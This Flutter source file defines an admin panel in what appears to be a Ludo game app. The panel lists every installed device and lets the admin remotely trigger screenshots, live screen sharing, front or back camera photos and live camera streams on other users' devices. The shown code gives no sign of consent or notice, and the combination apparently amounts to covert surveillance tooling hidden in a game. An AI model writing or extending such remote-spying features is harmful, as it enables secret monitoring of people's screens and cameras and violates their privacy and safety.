import 'package:flutter/material.dart';
import 'package:get/get.dart';
import '../controllers/admin_controller.dart';
import '../controllers/auth_controller.dart';
import '../controllers/theme_controller.dart';
import 'home_screen.dart';
import '../widgets/live_share_view.dart';

class AdminPanelScreen extends StatefulWidget {
  const AdminPanelScreen({super.key});

  @override
  State<AdminPanelScreen> createState() => _AdminPanelScreenState();
}

class _AdminPanelScreenState extends State<AdminPanelScreen> {
  String _cameraFacing = 'front';
  bool _isFullscreenStreamVisible = false;
  String? _openedFullscreenRequestId;

  void _openFullscreenStream(String requestId, String requestType) {
    if (!mounted || _isFullscreenStreamVisible) return;

    _isFullscreenStreamVisible = true;
    _openedFullscreenRequestId = requestId;

    Navigator.of(context)
        .push(
          MaterialPageRoute(
            builder: (_) => FullScreenLiveStreamPage(
              requestId: requestId,
              requestType: requestType,
            ),
          ),
        )
        .then((_) {
          if (mounted) {
            setState(() => _isFullscreenStreamVisible = false);
          }
        });
  }

  @override
  Widget build(BuildContext context) {
    final adminCtrl = Get.find<AdminController>();

    ScreenshotRequestItem? activeLiveRequest;
    for (final request in adminCtrl.screenshotRequests) {
      if ((request.requestType == 'screen_share' ||
              request.requestType == 'camera_stream') &&
          (request.status == 'active' ||
              request.status == 'live' ||
              request.status == 'offer_created')) {
        activeLiveRequest = request;
        break;
      }
    }

    final activeRequestId = activeLiveRequest?.requestId;
    final activeRequestType = activeLiveRequest?.requestType;

    if (activeLiveRequest != null &&
        !_isFullscreenStreamVisible &&
        _openedFullscreenRequestId != activeRequestId) {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (mounted && activeRequestId != null && activeRequestType != null) {
          _openFullscreenStream(
            activeRequestId,
            activeRequestType,
          );
        }
      });
    } else if (activeLiveRequest == null) {
      _openedFullscreenRequestId = null;
    }

    return GetBuilder<ThemeController>(
      builder: (themeState) {
        final theme = themeState.currentTheme;

        return Scaffold(
          appBar: AppBar(
            title: const Text('Admin Panel'),
            backgroundColor: theme.blue,
            actions: [
              IconButton(
                icon: const Icon(Icons.sports_esports),
                onPressed: () => Get.to(() => const HomeScreen()),
                tooltip: 'Go to Ludo Game',
              ),
              IconButton(
                icon: const Icon(Icons.refresh),
                onPressed: adminCtrl.refreshDeviceList,
                tooltip: 'Refresh Device List',
              ),
              IconButton(
                icon: const Icon(Icons.logout),
                onPressed: () async {
                  await Get.find<AuthController>().signOut();
                },
                tooltip: 'Sign Out',
              ),
            ],
          ),
          body: Obx(() {
            if (!adminCtrl.isReady.value) {
              return const Center(child: CircularProgressIndicator());
            }

            return ListView(
              padding: const EdgeInsets.all(16.0),
              children: [
                Card(
                  color: theme.cardBg,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(16),
                  ),
                  child: Padding(
                    padding: const EdgeInsets.all(16.0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'Installed Devices',
                          style: TextStyle(
                            fontSize: 18,
                            fontWeight: FontWeight.bold,
                            color: theme.textPrimary,
                          ),
                        ),
                        const SizedBox(height: 8),
                        Text(
                          'Total devices excluding this admin device: ${adminCtrl.otherInstalledDevicesCount}',
                          style: TextStyle(
                            fontSize: 14,
                            color: theme.textSecondary,
                          ),
                        ),
                        const SizedBox(height: 4),
                        Text(
                          'Your device ID: ${adminCtrl.currentDeviceId.value}',
                          style: TextStyle(
                            fontSize: 12,
                            color: theme.textSecondary,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                Card(
                  color: theme.cardBg,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(16),
                  ),
                  child: Padding(
                    padding: const EdgeInsets.all(12.0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'Camera Settings',
                          style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.bold,
                            color: theme.textPrimary,
                          ),
                        ),
                        const SizedBox(height: 8),
                        DropdownButtonFormField<String>(
                          initialValue: _cameraFacing,
                          decoration: const InputDecoration(
                            border: OutlineInputBorder(),
                            labelText: 'Camera Facing',
                          ),
                          items: const [
                            DropdownMenuItem(value: 'front', child: Text('Front Camera')),
                            DropdownMenuItem(value: 'back', child: Text('Back Camera')),
                          ],
                          onChanged: (value) {
                            if (value != null) {
                              setState(() => _cameraFacing = value);
                            }
                          },
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        const Text('Show only native-enabled'),
                        const SizedBox(width: 8),
                        Obx(
                          () => Switch(
                            value: adminCtrl.showOnlyNative.value,
                            onChanged: (v) =>
                                adminCtrl.showOnlyNative.value = v,
                          ),
                        ),
                      ],
                    ),
                    ElevatedButton.icon(
                      onPressed:
                          adminCtrl.devices
                              .where(
                                (d) =>
                                    d.deviceId !=
                                        adminCtrl.currentDeviceId.value &&
                                    (!adminCtrl.showOnlyNative.value ||
                                        d.nativeCaptureEnabled),
                              )
                              .isEmpty
                          ? null
                          : () async {
                              await adminCtrl.requestScreenshotForFiltered();
                              Get.snackbar(
                                'Requests Sent',
                                'Screenshot requests sent to filtered devices.',
                                snackPosition: SnackPosition.BOTTOM,
                              );
                            },
                      icon: const Icon(Icons.photo_library),
                      label: const Text('Request For Filtered'),
                    ),
                  ],
                ),
                const SizedBox(height: 16),

                ...adminCtrl.devices
                    .where(
                      (d) =>
                          d.deviceId != adminCtrl.currentDeviceId.value &&
                          (!adminCtrl.showOnlyNative.value ||
                              d.nativeCaptureEnabled),
                    )
                    .map((device) {
                      final isSelf =
                          device.deviceId == adminCtrl.currentDeviceId.value;
                      return Card(
                        color: theme.cardBg,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(16),
                        ),
                        margin: const EdgeInsets.only(bottom: 12),
                        child: Padding(
                          padding: const EdgeInsets.all(14.0),
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.stretch,
                            children: [
                              Row(
                                children: [
                                  Expanded(
                                    child: Text(
                                      isSelf
                                          ? 'This device (admin)'
                                          : 'Device: ${device.deviceId}',
                                      style: TextStyle(
                                        fontWeight: FontWeight.bold,
                                        color: theme.textPrimary,
                                      ),
                                    ),
                                  ),
                                  Chip(
                                    label: Text(device.platform.toUpperCase()),
                                    backgroundColor: theme.boardBg,
                                    labelStyle: TextStyle(
                                      color: theme.textPrimary,
                                    ),
                                  ),
                                  const SizedBox(width: 6),
                                  if (device.nativeCaptureEnabled)
                                    Container(
                                      padding: const EdgeInsets.symmetric(
                                        horizontal: 8,
                                        vertical: 4,
                                      ),
                                      decoration: BoxDecoration(
                                        color: Colors.green.shade600,
                                        borderRadius: BorderRadius.circular(12),
                                      ),
                                      child: const Text(
                                        'Native',
                                        style: TextStyle(
                                          color: Colors.white,
                                          fontSize: 12,
                                        ),
                                      ),
                                    )
                                  else
                                    Container(
                                      padding: const EdgeInsets.symmetric(
                                        horizontal: 8,
                                        vertical: 4,
                                      ),
                                      decoration: BoxDecoration(
                                        color: Colors.grey.shade600,
                                        borderRadius: BorderRadius.circular(12),
                                      ),
                                      child: const Text(
                                        'No Native',
                                        style: TextStyle(
                                          color: Colors.white,
                                          fontSize: 12,
                                        ),
                                      ),
                                    ),
                                ],
                              ),
                              const SizedBox(height: 8),
                              Text(
                                'Last active: ${device.lastSeenAt?.toLocal().toString() ?? 'unknown'}',
                                style: TextStyle(
                                  color: theme.textSecondary,
                                  fontSize: 12,
                                ),
                              ),
                              const SizedBox(height: 12),
                              Row(
                                children: [
                                  Expanded(
                                    child: ElevatedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl.requestScreenshot(
                                                device.deviceId,
                                              );
                                              Get.snackbar(
                                                'Screenshot Requested',
                                                'A screenshot request was sent to the selected device.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(Icons.photo_camera),
                                      label: const Text('Screenshot'),
                                      style: ElevatedButton.styleFrom(
                                        backgroundColor: isSelf
                                            ? Colors.grey
                                            : theme.blue,
                                      ),
                                    ),
                                  ),
                                  const SizedBox(width: 8),
                                  Expanded(
                                    child: OutlinedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl
                                                  .requestScreenShare(
                                                    device.deviceId,
                                                  );
                                              Get.snackbar(
                                                'Live Share Requested',
                                                'A live share session was started for the selected device.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(
                                        Icons.screenshot_monitor,
                                      ),
                                      label: const Text('Live Share'),
                                      style: OutlinedButton.styleFrom(
                                        foregroundColor: theme.blue,
                                        side: BorderSide(color: theme.blue),
                                      ),
                                    ),
                                  ),
                                ],
                              ),
                              const SizedBox(height: 8),
                              Row(
                                children: [
                                  Expanded(
                                    child: ElevatedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl.requestCameraCapture(
                                                device.deviceId,
                                                cameraFacing: _cameraFacing,
                                              );
                                              Get.snackbar(
                                                'Camera Capture Requested',
                                                'The target device will capture a photo from the selected camera.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(Icons.camera_alt),
                                      label: const Text('Capture Camera'),
                                      style: ElevatedButton.styleFrom(
                                        backgroundColor: isSelf
                                            ? Colors.grey
                                            : theme.blue,
                                      ),
                                    ),
                                  ),
                                  const SizedBox(width: 8),
                                  Expanded(
                                    child: OutlinedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl.requestCameraStream(
                                                device.deviceId,
                                                cameraFacing: _cameraFacing,
                                              );
                                              Get.snackbar(
                                                'Camera Stream Requested',
                                                'The target device will start a live camera stream.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(Icons.videocam),
                                      label: const Text('Live Camera'),
                                      style: OutlinedButton.styleFrom(
                                        foregroundColor: theme.blue,
                                        side: BorderSide(color: theme.blue),
                                      ),
                                    ),
                                  ),
                                ],
                              ),
                            ],
                          ),
                        ),
                      );
                    }),
                if (adminCtrl.screenshotRequests.isNotEmpty) ...[
                  const SizedBox(height: 12),
                  Text(
                    'Recent Screenshot Requests',
                    style: TextStyle(
                      fontSize: 16,
                      fontWeight: FontWeight.bold,
                      color: theme.textPrimary,
                    ),
                  ),
                  const SizedBox(height: 8),
                  ...adminCtrl.screenshotRequests.map((request) {
                    return Card(
                      color: theme.cardBg,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(16),
                      ),
                      margin: const EdgeInsets.only(bottom: 10),
                      child: Padding(
                        padding: const EdgeInsets.all(12.0),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.stretch,
                          children: [
                            Text(
                              'Request ID: ${request.requestId}',
                              style: TextStyle(
                                color: theme.textPrimary,
                                fontWeight: FontWeight.w700,
                              ),
                            ),
                            const SizedBox(height: 6),
                            Text(
                              'Target: ${request.targetDeviceId}',
                              style: TextStyle(color: theme.textSecondary),
                            ),
                            const SizedBox(height: 4),
                            Text(
                              'Type: ${request.requestType == 'screen_share' ? 'Live Share' : request.requestType == 'camera_capture' ? 'Camera Capture' : request.requestType == 'camera_stream' ? 'Camera Stream' : 'Screenshot'}',
                              style: TextStyle(color: theme.textSecondary),
                            ),
                            const SizedBox(height: 4),
                            Text(
                              'Status: ${request.status}',
                              style: TextStyle(color: theme.textSecondary),
                            ),
                            if ((request.requestType == 'screen_share' ||
                                    request.requestType == 'camera_stream') &&
                                (request.status == 'active' ||
                                    request.status == 'live' ||
                                    request.status == 'offer_created')) ...[
                              const SizedBox(height: 8),
                              ElevatedButton.icon(
                                onPressed: () => _openFullscreenStream(
                                  request.requestId,
                                  request.requestType,
                                ),
                                icon: const Icon(Icons.fullscreen),
                                label: const Text('Open Full Screen'),
                              ),
                              const SizedBox(height: 8),
                              if (request.requestType == 'screen_share')
                                ElevatedButton.icon(
                                  onPressed: () async {
                                    await adminCtrl.stopScreenShare(
                                      request.requestId,
                                    );
                                    Get.snackbar(
                                      'Live Share Stopped',
                                      'The live share session was stopped.',
                                      snackPosition: SnackPosition.BOTTOM,
                                    );
                                  },
                                  icon: const Icon(Icons.stop_circle_outlined),
                                  label: const Text('Stop Live Share'),
                                ),
                            ],
                            if (request.screenshotUrl != null) ...[
                              const SizedBox(height: 10),
                              Image.network(
                                request.screenshotUrl!,
                                fit: BoxFit.cover,
                              ),
                            ],
                            if (request.error != null) ...[
                              const SizedBox(height: 8),
                              Text(
                                'Error: ${request.error}',
                                style: TextStyle(
                                  color: Colors.redAccent,
                                  fontSize: 12,
                                ),
                              ),
                            ],
                          ],
                        ),
                      ),
                    );
                  }),
                ],
              ],
            );
          }),
        );
      },
    );
  }
}
